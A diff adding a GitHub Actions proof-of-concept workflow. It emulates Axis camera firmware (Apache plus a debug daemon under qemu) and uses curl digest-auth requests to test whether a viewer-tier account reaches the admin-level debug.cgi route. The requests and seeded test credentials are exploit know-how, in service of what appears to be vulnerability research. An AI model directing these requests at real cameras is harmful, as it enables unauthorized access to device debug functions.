@@ -1,0 +1,250 @@
+name: http-hop-poc
+# Executed-proof harness (HTTP layer, HYP-AX-002): starts the SHIPPED Apache
+# (httpd.apache2 + shipped /etc/apache2 configs) and dbox (debugar.cgi -n) under
+# qemu-user inside the firmware chroot, then drives the full chain:
+#   curl (viewer tier) -> Apache digest auth (axis-group-file, viewer group)
+#   -> mod_trax Transfer /var/run/dbg-cgi/ctrl-cgi-socket -> dbox -> response.
+# Only additions vs shipped config: the /run/apache2 runtime files that
+# httpd-generate-config writes on device (parameters.conf Define block +
+# failsafe default vhost for a cert-less device), and the auth data files
+# user-manager writes (digest_auth_passwd/group_auth/basic_auth_passwd).
+# No security directive is removed or weakened.
+on:
+  workflow_dispatch:
+    inputs:
+      firmware_url:
+        description: "Official ftp.axis.com .bin URL"
+        required: true
+      firmware_sha256:
+        description: "Expected SHA256 of the .bin"
+        required: true
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install tooling
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq qemu-user-static zstd python3-pip gcc-aarch64-linux-gnu libc6-dev-arm64-cross
+          python3 -m pip install --quiet PySquashfsImage zstandard
+
+      - name: Download and verify official firmware
+        run: |
+          cd /tmp
+          curl -sS -o fw.bin "${{ github.event.inputs.firmware_url }}"
+          echo "${{ github.event.inputs.firmware_sha256 }}  fw.bin" | sha256sum -c -
+
+      - name: Unpack container + extract rootfs (real symlinks)
+        run: |
+          cd /tmp
+          python3 - <<'EOF'
+          import gzip, tarfile, os, sys
+          magic = open('fw.bin','rb').read(4)
+          if magic[:2] == b'\x1f\x8b':
+              raw = gzip.open('fw.bin','rb').read()
+          elif magic == b'\x28\xb5\x2f\xfd':
+              import zstandard
+              raw = zstandard.ZstdDecompressor().stream_reader(open('fw.bin','rb')).read()
+          else:
+              sys.exit('unknown container magic %r' % magic)
+          open('fw.tar','wb').write(raw)
+          tf = tarfile.open('fw.tar'); tf.extractall('pkg')
+          from PySquashfsImage import SquashFsImage
+          img = SquashFsImage(open('pkg/rootfs.img','rb'))
+          def sanitize(n):
+              for c in '\\/:*?"<>|': n = n.replace(c,'_')
+              return n
+          def walk(node, outdir):
+              name = node.name
+              if isinstance(name, bytes): name = name.decode('utf-8','replace')
+              path = os.path.join(outdir, sanitize(name))
+              if node.is_dir:
+                  os.makedirs(path, exist_ok=True)
+                  for ch in node.iterdir():
+                      try: walk(ch, path)
+                      except Exception as e: print('walk fail', path, e)
+                  return
+              if node.is_symlink:
+                  t = node.readlink()
+                  if isinstance(t, bytes): t = t.decode('utf-8','replace')
+                  try:
+                      if os.path.lexists(path): os.remove(path)
+                      os.symlink(t, path)
+                  except (OSError, ValueError):
+                      open(path + '.symlink','w').write(t)
+                  return
+              try: data = img.read_file(node.inode)
+              except Exception as e:
+                  print('read fail', path, e); return
+              if data is None: return
+              open(path,'wb').write(data)
+              try: os.chmod(path, node.mode & 0o777)
+              except OSError: pass
+          os.makedirs('rootfs', exist_ok=True)
+          for ch in img.root.iterdir(): walk(ch, 'rootfs')
+          print('rootfs extracted')
+          EOF
+          sudo mv /tmp/rootfs /opt/rootfs
+
+      - name: Provision chroot runtime dirs + runtime config (httpd-generate-config equivalents)
+        run: |
+          # dangling-symlink runtime dirs -> real dirs (device has tmpfs there)
+          for p in var/run var/tmp var/volatile tmp run; do
+            if [ -L "/opt/rootfs/$p" ]; then sudo rm -f "/opt/rootfs/$p"; fi
+            sudo mkdir -p "/opt/rootfs/$p"
+          done
+          sudo mkdir -p /opt/rootfs/var/run/dbg-cgi
+          sudo mkdir -p /opt/rootfs/run/apache2/virtualhosts
+          # Apache DefaultRuntimeDir (ServerRoot=/usr -> /usr/logs): mutex/cgid socket dir
+          sudo mkdir -p /opt/rootfs/usr/logs
+          sudo chmod 1777 /opt/rootfs/tmp
+          sudo mknod /opt/rootfs/dev/null c 1 3 2>/dev/null || true
+          sudo mknod /opt/rootfs/dev/urandom c 1 9 2>/dev/null || true
+          sudo mknod /opt/rootfs/dev/random c 1 8 2>/dev/null || true
+          sudo chmod 666 /opt/rootfs/dev/null /opt/rootfs/dev/urandom /opt/rootfs/dev/random 2>/dev/null || true
+
+          # ---- /run/apache2/parameters.conf (replicates httpd-generate-config output;
+          #      defaults from httpd_parload/httpd_vega_parload normalization) ----
+          # Device default port is 80 (APACHE_PORT=80). No cert in chroot, so the
+          # generator's own failsafe path (SECURE=0) serves HTTP + digest auth on 80.
+          sudo tee /opt/rootfs/run/apache2/parameters.conf > /dev/null <<'EOF'
+          Define APACHE_PORT 80
+          Define HTTPS_PORT 443
+          Define AXIS_REALM AXIS_0012345678
+          Define AXIS_WS_REALM AXIS_WS_0012345678
+          Define APACHE_KEEPALIVETIMEOUT_S 180
+          Define APACHE_ACCESSLOG Off
+          Define APACHE_PAGECOUNTTHROTTLE 20
+          Define APACHE_SITECOUNTTHROTTLE 20
+          Define APACHE_PAGEINTERVALTHROTTLE 1
+          Define APACHE_SITEINTERVALTHROTTLE 1
+          Define APACHE_BLOCKINGPERIODTHROTTLE 10
+          Define MAX_WORKERS 4
+          Define MIN_SPARE_THREADS 1
+          Define MAX_SPARE_THREADS 4
+          Define RTSP_TIMEOUT 180
+          Define APACHE_DIGEST_NONCE_LIFETIME 300
+          EOF
+
+          # ---- /run/apache2/virtualhosts/vhosts.conf ----
+          # Verbatim add_default_host() output from usr/share/apache2/virtualhost-config
+          # for a device with no server certificate (HAS_HTTPS_CERT=no -> SECURE=0,
+          # AUTH_TYPE=httpd-digest). This is where the shipped digest gate
+          # (httpd-digest-auth.conf: /usr/html AuthType Digest + Require axis-group-file)
+          # gets attached to the external listener.
+          sudo tee /opt/rootfs/run/apache2/virtualhosts/vhosts.conf > /dev/null <<'EOF'
+          <VirtualHost [::]:80>
+            IncludeOptional /etc/apache2/conf.d/vhosts/external/*.conf
+            ServerName default
+            Include /etc/apache2/httpd-digest-auth.conf
+            IncludeOptional /etc/apache2/conf.d/vhosts/all/*.conf
+            IncludeOptional /etc/apache2/conf.d/vhosts/http/*.conf
+            Include /etc/apache2/httpd-auth-preview-mode.conf
+            IncludeOptional /run/apache2/customheaders.conf
+          </VirtualHost>
+          Listen 80
+          EOF
+
+          # ---- Auth data files user-manager writes (verified formats) ----
+          # digest: user:realm:md5(user:realm:pass); realm = ${AXIS_REALM}
+          sudo tee /opt/rootfs/etc/apache2/digest_auth_passwd > /dev/null <<'EOF'
+          viewer1:AXIS_0012345678:9f6acf59dd3a4a4e5b22ce2e550ee38d
+          admin1:AXIS_0012345678:3cf5bc700f9088ce9b396f00c867546b
+          EOF
+          # group_auth: tier groups (shipped template has admin:/operator:/viewer:/ptz:)
+          sudo tee /opt/rootfs/etc/apache2/group_auth > /dev/null <<'EOF'
+          admin: admin1
+          operator:
+          viewer: viewer1
+          ptz:
+          EOF
+          # basic_auth_passwd (htpasswd): service accounts share this file on device
+          SVC=$(openssl passwd -apr1 -salt axp0c 'servicepass')
+          sudo printf 'storage:%s\n' "$SVC" | sudo tee /opt/rootfs/etc/apache2/basic_auth_passwd > /dev/null
+          sudo chmod 644 /opt/rootfs/etc/apache2/digest_auth_passwd /opt/rootfs/etc/apache2/group_auth /opt/rootfs/etc/apache2/basic_auth_passwd
+
+          sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/
+          sudo ls -la /opt/rootfs/run/apache2/ /opt/rootfs/run/apache2/virtualhosts/
+          echo "=== digest_auth_passwd ==="; sudo cat /opt/rootfs/etc/apache2/digest_auth_passwd
+          echo "=== group_auth ==="; sudo cat /opt/rootfs/etc/apache2/group_auth
+
+      - name: Start dbox daemon (must predate apache), then Apache -X under qemu
+        run: |
+          echo "=== START dbox (debugar.cgi -n) in chroot; self-setuid to debugar(503) on device ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/debugar.cgi -n > /tmp/dbox.log 2>&1 &
+          sleep 6
+          sudo ls -la /opt/rootfs/var/run/dbg-cgi/ || true
+
+          echo "=== START shipped Apache (httpd.apache2 -X, single-process foreground) ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X -E /tmp/httpd-err.log > /tmp/httpd.log 2>&1 &
+          sleep 10
+          echo "=== processes ==="
+          pgrep -af qemu-aarch64 | head -6 || true
+          echo "=== httpd stdout/stderr ==="
+          sudo cat /tmp/httpd.log 2>/dev/null | head -20
+          echo "=== httpd -E startup error log (verbatim) ==="
+          sudo cat /tmp/httpd-err.log 2>/dev/null | head -40
+          echo "=== listeners (port 80) ==="
+          sudo ss -ltn | grep -E ':80\b' || echo "NOTHING LISTENING ON :80"
+          echo "=== dbox socket ==="
+          sudo ls -la /opt/rootfs/var/run/dbg-cgi/ || true
+
+      - name: HTTP chain requests (verbatim captures)
+        continue-on-error: true
+        run: |
+          set +e
+          HOSTIP=$(hostname -I | awk '{print $1}')
+          echo "HOSTIP=$HOSTIP"
+          D="http://$HOSTIP/axis-cgi/debug/debug.cgi?mon"
+          FW="http://$HOSTIP/axis-cgi/firmwaremanagement.cgi"
+          DISKS="http://$HOSTIP/axis-cgi/disks/list.cgi"
+
+          echo "=== (a) NO-AUTH viewer route: GET debug.cgi?mon (expect 401 digest challenge) ==="
+          curl -sS -i --max-time 20 "$D" 2>&1 | tee /tmp/resp_a_noauth.txt | head -20
+
+          echo "=== (b) VIEWER TIER: viewer1 digest on debug.cgi?mon -> mod_trax -> dbox ==="
+          curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "$D" 2>&1 | tee /tmp/resp_b_viewer.txt | head -45
+
+          echo "=== (c) CONTROL: viewer1 on firmwaremanagement.cgi (admin-only CGI) ==="
+          curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "$FW" 2>&1 | tee /tmp/resp_c_firmware.txt | head -25
+
+          echo "=== (c2) CONTROL: viewer1 on disks/list.cgi (TransferProxy route, <Proxy *> requires axis-group admin) ==="
+          curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "$DISKS" 2>&1 | tee /tmp/resp_c2_disks_viewer.txt | head -25
+
+          echo "=== (d) ADMIN TIER: admin1 digest on debug.cgi?mon (comparison) ==="
+          curl -sS -i --digest --max-time 30 -u admin1:admin1pass "$D" 2>&1 | tee /tmp/resp_d_admin.txt | head -45
+
+          echo "=== (d2) admin1 on disks/list.cgi (proxy admin check comparison) ==="
+          curl -sS -i --digest --max-time 30 -u admin1:admin1pass "$DISKS" 2>&1 | tee /tmp/resp_d2_disks_admin.txt | head -25
+
+          echo "=== (e) in-chroot aarch64 curl to ::1 (in-device observation) viewer1 on debug route ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "http://[::1]/axis-cgi/debug/debug.cgi?mon" 2>&1 | tee /tmp/resp_e_inchroot.txt | head -45
+
+          echo "=== apache runtime view of the transfer (error log tail) ==="
+          sudo cat /tmp/httpd-err.log 2>/dev/null | tail -30
+          echo "=== dbox log ==="
+          sudo cat /tmp/dbox.log 2>/dev/null | head -20
+          echo "=== response artifacts ==="
+          wc -c /tmp/resp_*.txt 2>/dev/null
+
+      - name: Archive logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: http-hop-poc-logs
+          path: |
+            /tmp/httpd.log
+            /tmp/httpd-err.log
+            /tmp/dbox.log
+            /tmp/resp_a_noauth.txt
+            /tmp/resp_b_viewer.txt
+            /tmp/resp_c_firmware.txt
+            /tmp/resp_c2_disks_viewer.txt
+            /tmp/resp_d_admin.txt
+            /tmp/resp_d2_disks_admin.txt
+            /tmp/resp_e_inchroot.txt
+          if-no-files-found: ignore
